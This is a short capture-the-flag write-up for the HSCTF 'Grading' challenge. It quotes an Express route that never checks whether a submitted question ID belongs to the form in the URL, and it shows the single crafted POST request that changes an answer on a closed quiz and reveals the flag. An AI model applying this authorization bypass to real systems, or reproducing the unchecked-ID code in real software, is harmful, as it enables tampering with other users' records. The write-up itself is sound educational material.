# Grading

Application doesn't let me submit through form. 
When creating a post request to
`http://localhost.:3000/60c8af178108ed125476b517`
it returns
```json
{"response":"heh"}
```

Application returns flag if all answers are correct and deadline has passed

We cannot change the date anyway so we have to somehow modify the already failed quiz. 

App handles post request to formId like this
```javascript
.post(authMW, (req, res) => {
    const now = Date.now()
    const form = req.user.forms.id(req.params.formID)
    console.log(form)
    console.log(req.body)
    if(now > form.deadline) {
        res.json({response: "too late"})
    } else {
        if(req.body.ID) {
            const question = req.user.questions.id(req.body.ID)
            console.log(question);
            question.submission = req.body.value
            req.user.save()
        } else {
            form.submitted = true
            req.user.save()
        }

        res.json({response: "heh"})
    }

})
```

It doesn't check if question id belongs to a right quiz when creating a submission. So we can create a post request where param `formId` is the allowed form. Then the request body needs `ID` which will be the question from `simpleQuiz` form and `value` will be 'Africa is not a country'

```
POST /60c8af178108ed125476b517 HTTP/1.1

ID=60c8af178108ed125476b514&value=Africa is not a country
```

simpleQuiz response now includes the flag
```
 <h2>The deadline has passed. You got 1 questions right.</h2>

            <p>here is the flag: <b>flag{th3_an5w3r_w4s_HSCTF_0bvi0us1y}</b></p>
```

## Flag
flag{th3_an5w3r_w4s_HSCTF_0bvi0us1y}